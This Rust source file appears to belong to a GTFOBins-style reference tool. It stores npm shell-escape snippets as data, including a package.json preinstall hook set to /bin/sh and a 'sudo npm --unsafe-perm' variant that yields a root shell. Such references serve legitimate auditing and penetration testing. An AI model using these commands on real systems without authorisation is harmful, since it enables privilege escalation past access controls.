pub static BIN_NAME: &'static str = "npm";
pub static SH_CODE_1: &'static str = r#"
    
    npm exec /bin/sh
"#;
pub static SH_DESC_2: &'static str = "Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`.";
pub static SH_CODE_2: &'static str = r#"
    
    TF=$(mktemp -d)
    echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
    npm -C $TF i
"#;
pub static SUDO_DESC: &'static str = "Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`.";
pub static SUDO_CODE: &'static str = r#"
    
    TF=$(mktemp -d)
    echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
    sudo npm -C $TF --unsafe-perm i
"#;
use crate::code::{Code, Tag};
pub static SH_1: Code<'static> = Code {
    title: "SH_CODE_1",
    code: SH_CODE_1,
    tag: Tag::SH,
};
pub static SH_2: Code<'static> = Code {
    title: "SH_CODE_2",
    code: SH_CODE_2,
    tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
